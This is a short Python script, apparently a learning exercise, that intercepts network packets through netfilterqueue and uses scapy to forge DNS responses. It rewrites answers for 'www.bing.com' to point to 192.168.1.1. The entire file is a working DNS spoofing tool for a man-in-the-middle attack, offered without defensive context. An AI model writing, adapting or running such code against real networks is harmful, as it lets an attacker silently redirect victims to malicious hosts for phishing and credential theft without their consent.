import netfilterqueue
from subprocess import call
import scapy.all as scapy
from sys import argv


def process_packet(packet):
    scapy_packet = scapy.IP(packet.get_payload())

    print("[+]Packet recived --> {}".format(scapy_packet.haslayer(scapy.DNSRR)))
    # shecking if the packet has a dns response
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if "www.bing.com" in qname:
            print('[+]Spoofing the site')
            respose_edit = scapy.DNSRR(rrname=qname, rdata="192.168.1.1")
            scapy_packet[scapy.DNS].an = respose_edit
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(str(scapy_packet))

    packet.accept()


try:
    que_num = int(argv[1])
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(que_num, process_packet)
    queue.run()
except Exception as error:
    print(error)
    